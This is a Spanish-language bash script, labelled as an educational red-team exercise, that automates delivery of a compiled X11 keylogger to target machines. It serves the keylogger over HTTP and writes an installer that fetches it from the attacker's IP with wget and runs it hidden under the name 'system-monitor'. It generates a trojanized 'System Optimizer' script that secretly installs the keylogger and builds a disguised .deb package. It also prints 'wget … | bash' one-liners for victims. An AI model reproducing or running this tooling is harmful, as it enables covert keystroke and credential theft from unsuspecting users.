#!/bin/bash
# deploy_payload.sh
# Script unificado para gestionar métodos de entrega del keylogger educativo
# Uso: ./deploy_payload.sh

set -e

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Variables globales
ATTACKER_IP=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
HTTP_PORT=8080
DELIVERY_DIR="delivery_payload"
DEB_PACKAGE=""

# Función para mostrar banner
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║   PAYLOAD DELIVERY MANAGER - Keylogger Educativo X11          ║
║   Práctica de Auditoría de Seguridad - Red Team               ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}⚠️  ADVERTENCIA: Solo para uso educativo y autorizado${NC}"
    echo -e "${YELLOW}⚠️  Entorno: Laboratorio controlado${NC}"
    echo ""
}

# Función para verificar requisitos
check_requirements() {
    echo -e "${BLUE}[*] Verificando requisitos...${NC}"
    
    # Verificar que estamos en el directorio correcto
    if [ ! -f "x11_keylogger.c" ]; then
        echo -e "${RED}[!] Error: No se encuentra x11_keylogger.c${NC}"
        echo -e "${RED}[!] Ejecute este script desde el directorio del proyecto${NC}"
        exit 1
    fi
    
    # Verificar que el keylogger esté compilado
    if [ ! -f "x11_keylogger" ]; then
        echo -e "${YELLOW}[!] Keylogger no compilado. Compilando...${NC}"
        make || {
            echo -e "${RED}[!] Error al compilar. Instale dependencias:${NC}"
            echo "    sudo apt-get install build-essential libx11-dev libxtst-dev"
            exit 1
        }
    fi
    
    # Verificar herramientas
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}[!] Python3 no encontrado${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[✓] Todos los requisitos cumplidos${NC}"
    echo ""
}

# Función para obtener IP del atacante
get_attacker_ip() {
    if [ -z "$ATTACKER_IP" ]; then
        echo -e "${YELLOW}[!] No se pudo detectar IP automáticamente${NC}"
        read -p "Ingrese la IP del atacante: " ATTACKER_IP
    fi
    echo -e "${GREEN}[*] IP del atacante: $ATTACKER_IP${NC}"
    echo ""
}

# MÉTODO 1: Servidor HTTP Simple
method1_http_server() {
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}  MÉTODO 1: Servidor HTTP de Descarga${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo ""
    
    # Crear directorio de entrega
    echo -e "${BLUE}[*] Preparando servidor de entrega...${NC}"
    mkdir -p "$DELIVERY_DIR"
    
    # Copiar binario
    cp x11_keylogger "$DELIVERY_DIR/"
    
    # Crear script instalador
    cat > "$DELIVERY_DIR/install.sh" <<'EOF'
#!/bin/bash
echo "[*] Instalando System Monitor..."
INSTALL_DIR="$HOME/.local/bin"
mkdir -p "$INSTALL_DIR"
cp x11_keylogger "$INSTALL_DIR/system-monitor" 2>/dev/null || {
    wget http://ATTACKER_IP:8080/x11_keylogger -O "$INSTALL_DIR/system-monitor"
}
chmod +x "$INSTALL_DIR/system-monitor"
cd "$INSTALL_DIR"
nohup ./system-monitor > /dev/null 2>&1 &
echo "[*] System Monitor instalado y ejecutándose (PID: $!)"
EOF
    
    # Reemplazar ATTACKER_IP
    sed -i "s/ATTACKER_IP/$ATTACKER_IP/g" "$DELIVERY_DIR/install.sh"
    chmod +x "$DELIVERY_DIR/install.sh"
    
    # Crear README
    cat > "$DELIVERY_DIR/README.txt" <<EOF
SYSTEM MONITOR TOOL
===================

Herramienta de monitoreo de sistema para X11.

INSTALACIÓN:
1. Descargar: wget http://$ATTACKER_IP:$HTTP_PORT/install.sh
2. Ejecutar: bash install.sh

O en un solo comando:
wget http://$ATTACKER_IP:$HTTP_PORT/install.sh -O - | bash
EOF
    
    echo -e "${GREEN}[✓] Archivos preparados en $DELIVERY_DIR/${NC}"
    echo ""
    
    # Mostrar instrucciones
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  INSTRUCCIONES PARA EL SISTEMA OBJETIVO${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${GREEN}Método A - Descarga directa del binario:${NC}"
    echo "  wget http://$ATTACKER_IP:$HTTP_PORT/x11_keylogger"
    echo "  chmod +x x11_keylogger"
    echo "  ./x11_keylogger"
    echo ""
    echo -e "${GREEN}Método B - Script instalador:${NC}"
    echo "  wget http://$ATTACKER_IP:$HTTP_PORT/install.sh"
    echo "  bash install.sh"
    echo ""
    echo -e "${GREEN}Método C - One-liner:${NC}"
    echo "  wget http://$ATTACKER_IP:$HTTP_PORT/install.sh -O - | bash"
    echo ""
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Iniciar servidor
    echo -e "${BLUE}[*] Iniciando servidor HTTP en puerto $HTTP_PORT...${NC}"
    echo -e "${GREEN}[*] Servidor activo en: http://$ATTACKER_IP:$HTTP_PORT${NC}"
    echo -e "${YELLOW}[*] Presione Ctrl+C para detener${NC}"
    echo ""
    
    cd "$DELIVERY_DIR"
    python3 -m http.server $HTTP_PORT
}

# MÉTODO 2: Script Troyanizado
method2_trojan_script() {
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}  MÉTODO 2: Script Troyanizado${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo ""
    
    TROJAN_SCRIPT="system_optimizer_trojan.sh"
    
    echo -e "${BLUE}[*] Creando script troyanizado...${NC}"
    
    # Crear script con funciones legítimas + payload
    cat > "$TROJAN_SCRIPT" <<'TROJAN_EOF'
#!/bin/bash
# System Optimizer Tool v2.1 (TROJAN - EDUCATIVO)

GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}╔═══════════════════════════════════╗${NC}"
echo -e "${BLUE}║  SYSTEM OPTIMIZER v2.1            ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════╝${NC}"
echo ""

# Función legítima: mostrar info del sistema
show_info() {
    echo -e "${GREEN}[*] Información del Sistema:${NC}"
    echo "Hostname: $(hostname)"
    echo "Usuario: $(whoami)"
    echo "Memoria: $(free -h | grep Mem | awk '{print $3 "/" $2}')"
    echo ""
}

# Función legítima: limpiar archivos temporales
clean_temp() {
    echo -e "${GREEN}[*] Limpiando archivos temporales...${NC}"
    rm -rf /tmp/tmp.* 2>/dev/null || true
    echo "[✓] Limpieza completada"
    echo ""
}

# PAYLOAD: Instalar keylogger
deploy_keylogger() {
    echo -e "${GREEN}[*] Instalando módulo de monitoreo avanzado...${NC}"
    INSTALL_DIR="$HOME/.config/system-tools"
    mkdir -p "$INSTALL_DIR"
    
    # Descargar keylogger
    wget -q http://ATTACKER_IP:8080/x11_keylogger -O "$INSTALL_DIR/monitor" 2>/dev/null || {
        echo "[!] No se pudo descargar el módulo"
        return 1
    }
    
    chmod +x "$INSTALL_DIR/monitor"
    cd "$INSTALL_DIR"
    nohup ./monitor > /dev/null 2>&1 &
    echo "[✓] Módulo de monitoreo instalado (PID: $!)"
}

# Menú principal
show_info
echo "1) Limpiar archivos temporales"
echo "2) Optimización completa (RECOMENDADO)"
echo "3) Salir"
read -p "Opción: " choice

case $choice in
    1) clean_temp ;;
    2) 
        show_info
        clean_temp
        deploy_keylogger
        echo -e "${GREEN}[✓] Optimización completa finalizada${NC}"
        ;;
    3) exit 0 ;;
esac
TROJAN_EOF
    
    # Reemplazar IP del atacante
    sed -i "s/ATTACKER_IP/$ATTACKER_IP/g" "$TROJAN_SCRIPT"
    chmod +x "$TROJAN_SCRIPT"
    
    echo -e "${GREEN}[✓] Script troyanizado creado: $TROJAN_SCRIPT${NC}"
    echo ""
    
    # Mostrar instrucciones
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  INSTRUCCIONES DE ENTREGA${NC}"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${GREEN}Opción A - Transferir via SCP:${NC}"
    echo "  scp $TROJAN_SCRIPT usuario@target:/tmp/optimizer.sh"
    echo ""
    echo -e "${GREEN}Opción B - Servir via HTTP:${NC}"
    echo "  1. Copiar a directorio de servidor:"
    echo "     cp $TROJAN_SCRIPT $DELIVERY_DIR/"
    echo "  2. Ejecutar servidor (Método 1)"
    echo "  3. En target:"
    echo "     wget http://$ATTACKER_IP:$HTTP_PORT/$TROJAN_SCRIPT"
    echo ""
    echo -e "${GREEN}En el sistema objetivo:${NC}"
    echo "  chmod +x $TROJAN_SCRIPT"
    echo "  ./$TROJAN_SCRIPT"
    echo "  # Seleccionar opción 2 (Optimización completa)"
    echo ""
    echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    
    read -p "¿Iniciar servidor HTTP para servir el script? (s/n): " resp
    if [[ "$resp" =~ ^[Ss]$ ]]; then
        mkdir -p "$DELIVERY_DIR"
        cp "$TROJAN_SCRIPT" "$DELIVERY_DIR/"
        cp x11_keylogger "$DELIVERY_DIR/"
        method1_http_server
    fi
}

# MÉTODO 3: Paquete DEB
method3_deb_package() {
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}  MÉTODO 3: Paquete DEB Malicioso${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo ""
    
    PKG_NAME="system-monitor"
    PKG_VERSION="1.0.0"
    PKG_DIR="${PKG_NAME}_${PKG_VERSION}"
    
    echo -e "${BLUE}[*] Creando estructura del paquete DEB...${NC}"
    
    # Limpiar directorio anterior
    rm -rf "$PKG_DIR" "${PKG_DIR}.deb" 2>/dev/null || true
    
    # Crear estructura
    mkdir -p "$PKG_DIR/DEBIAN"
    mkdir -p "$PKG_DIR/usr/local/bin"
    mkdir -p "$PKG_DIR/usr/share/applications"
    
    # Copiar binario
    cp x11_keylogger "$PKG_DIR/usr/local/bin/system-monitor"
    chmod 755 "$PKG_DIR/usr/local/bin/system-monitor"
    
    # Archivo control
    cat > "$PKG_DIR/DEBIAN/control" <<EOF
Package: system-monitor
Version: $PKG_VERSION
Section: utils
Priority: optional
Architecture: amd64
Depends: libx11-6, libxtst6
Maintainer: System Tools <tools@example.com>
Description: Advanced System Monitor
 Herramienta avanzada de monitoreo de sistema X11.
 Análisis en tiempo real de rendimiento.
EOF
    
    # Script post-instalación
    cat > "$PKG_DIR/DEBIAN/postinst" <<'EOF'
#!/bin/bash
set -e
echo "Configurando System Monitor..."
chmod 755 /usr/local/bin/system-monitor
ln -sf /usr/local/bin/system-monitor /usr/bin/sysmon 2>/dev/null || true
echo "System Monitor instalado. Ejecute: system-monitor"
exit 0
EOF
    chmod 755 "$PKG_DIR/DEBIAN/postinst"
    
    # Archivo .desktop
    cat > "$PKG_DIR/usr/share/applications/system-monitor.desktop" <<EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=System Monitor
Exec=/usr/local/bin/system-monitor
Icon=utilities-system-monitor
Terminal=true
Categories=System;Monitor;
EOF
    
    # Construir paquete
    echo -e "${BLUE}[*] Construyendo paquete DEB...${NC}"
    dpkg-deb --build "$PKG_DIR" >/dev/null 2>&1
    
    if [ -f "${PKG_DIR}.deb" ]; then
        DEB_PACKAGE="${PKG_DIR}.deb"
        SHA256=$(sha256sum "$DEB_PACKAGE" | cut -d' ' -f1)
        
        echo -e "${GREEN}[✓] Paquete creado: $DEB_PACKAGE${NC}"
        echo -e "${GREEN}[✓] SHA256: $SHA256${NC}"
        echo "$SHA256  $DEB_PACKAGE" > "${DEB_PACKAGE}.sha256"
        echo ""
        
        # Mostrar instrucciones
        echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
        echo -e "${YELLOW}  INSTRUCCIONES DE INSTALACIÓN${NC}"
        echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${GREEN}1. Transferir el paquete:${NC}"
        echo "   scp $DEB_PACKAGE usuario@target:/tmp/"
        echo ""
        echo -e "${GREEN}2. En el sistema objetivo:${NC}"
        echo "   cd /tmp"
        echo "   sudo dpkg -i $DEB_PACKAGE"
        echo "   sudo apt-get install -f  # Si faltan dependencias"
        echo ""
        echo -e "${GREEN}3. Ejecutar:${NC}"
        echo "   system-monitor"
        echo "   # O"
        echo "   sysmon"
        echo ""
        echo -e "${GREEN}4. Verificar instalación:${NC}"
        echo "   dpkg -l | grep system-monitor"
        echo "   ps aux | grep system-monitor"
        echo ""
        echo -e "${GREEN}5. Desinstalar (limpieza):${NC}"
        echo "   sudo dpkg -r system-monitor"
        echo ""
        echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
        echo ""
        
        read -p "¿Servir el .deb via HTTP? (s/n): " resp
        if [[ "$resp" =~ ^[Ss]$ ]]; then
            mkdir -p "$DELIVERY_DIR"
            cp "$DEB_PACKAGE" "$DELIVERY_DIR/"
            cp "${DEB_PACKAGE}.sha256" "$DELIVERY_DIR/"
            method1_http_server
        fi
    else
        echo -e "${RED}[!] Error al crear el paquete${NC}"
    fi
}

# FUNCIÓN DE LIMPIEZA
cleanup_environment() {
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}  LIMPIEZA POST-PRÁCTICA${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo ""
    
    echo -e "${YELLOW}[!] Esta función limpia el entorno después de la práctica${NC}"
    echo ""
    read -p "¿Continuar con la limpieza? (s/n): " resp
    
    if [[ ! "$resp" =~ ^[Ss]$ ]]; then
        return
    fi
    
    echo -e "${BLUE}[*] Limpiando directorios de entrega...${NC}"
    rm -rf "$DELIVERY_DIR" 2>/dev/null || true
    rm -f system_optimizer_trojan.sh 2>/dev/null || true
    rm -rf system-monitor_* 2>/dev/null || true
    
    echo -e "${GREEN}[✓] Limpieza local completada${NC}"
    echo ""
    
    echo -e "${YELLOW}Para limpiar el sistema objetivo, ejecute:${NC}"
    cat <<'EOF'
# Detener procesos
pkill -f x11_keylogger
pkill -f system-monitor

# Eliminar archivos
rm -rf ~/.local/bin/system-monitor
rm -rf ~/.config/system-tools
rm -rf ~/.config/system-monitor
rm -f ~/.config/autostart/system-monitor.desktop

# Desinstalar paquete DEB
sudo dpkg -r system-monitor 2>/dev/null || true

# Verificar limpieza
ps aux | grep -E "keylog|monitor"
find ~ -name "*keylog*" -o -name "*monitor*" 2>/dev/null
EOF
    echo ""
}

# MENÚ PRINCIPAL
show_menu() {
    show_banner
    get_attacker_ip
    
    echo -e "${CYAN}MÉTODOS DE ENTREGA DISPONIBLES:${NC}"
    echo ""
    echo "1) Servidor HTTP de Descarga (Simple y rápido)"
    echo "2) Script Troyanizado (Funcionalidad legítima + payload)"
    echo "3) Paquete DEB Malicioso (Más sofisticado)"
    echo "4) Limpieza Post-Práctica"
    echo "5) Ver guía completa"
    echo "6) Salir"
    echo ""
    read -p "Seleccione una opción [1-6]: " choice
    
    case $choice in
        1) method1_http_server ;;
        2) method2_trojan_script ;;
        3) method3_deb_package ;;
        4) cleanup_environment ;;
        5) 
            if [ -f "GUIA_ENTREGA_PAYLOAD.md" ]; then
                less GUIA_ENTREGA_PAYLOAD.md
            else
                echo -e "${YELLOW}[!] Guía no encontrada. Consulte la documentación del proyecto.${NC}"
            fi
            ;;
        6) 
            echo -e "${GREEN}Saliendo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            show_menu
            ;;
    esac
}

# EJECUCIÓN PRINCIPAL
check_requirements
show_menu
